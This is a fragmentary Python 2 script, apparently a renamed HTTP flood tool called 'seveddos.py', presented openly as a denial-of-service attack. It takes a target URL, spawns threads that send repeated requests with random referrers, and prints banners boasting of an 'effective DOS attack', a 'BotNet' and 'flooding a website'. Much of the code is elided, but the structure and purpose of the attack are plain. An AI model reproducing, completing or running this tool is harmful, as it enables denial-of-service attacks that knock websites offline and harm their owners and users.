# Created By Seve Scripts Do Not Edittss
import urllib2
import sys
import threading
import random
...
# Referrers that i Collect for 1 month
def referer_list():
...
def usage():
	...
	print 'Usage: seveddos.py (url)'
	print 'Example: seveddos.py http://example.con/'
	print "\a"
print \
"""
...
def httpcall(url):
	...
	try:
			...
			# Print The Code
			set_flag(1)
			print "----->>> ! AN EFFECTIVE DOS ATTACK - SeveScripts ! <<<-----"
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n-- Sending mass amount of packets generated by Seve BotNet --"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "ENJOY FLOODING A WEBSITE!!"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
